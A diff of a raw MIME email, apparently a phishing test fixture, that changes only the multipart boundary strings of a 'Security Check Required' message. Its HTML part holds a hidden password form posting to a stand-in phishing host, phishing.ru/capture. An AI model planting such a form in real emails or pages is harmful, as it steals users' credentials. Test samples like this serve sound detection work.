@@ -4,15 +4,15 @@ Subject: Security Check Required
 Date: Tue, 08 Sep 2026 10:00:00 +0000
 MIME-Version: 1.0
 Content-Type: multipart/alternative;
- boundary="===============1215155420626346566=="
+ boundary="===============6359073749373946694=="
 
---===============1215155420626346566==
+--===============6359073749373946694==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 7bit
 
 Your account needs verification.
 
---===============1215155420626346566==
+--===============6359073749373946694==
 Content-Type: text/html; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 MIME-Version: 1.0
@@ -20,4 +20,4 @@ MIME-Version: 1.0
 <form style=3D"display:none" action=3D"http://phishing.ru/capture"><input nam=
 e=3D"password" type=3D"password"></form>
 
---===============1215155420626346566==--
+--===============6359073749373946694==--
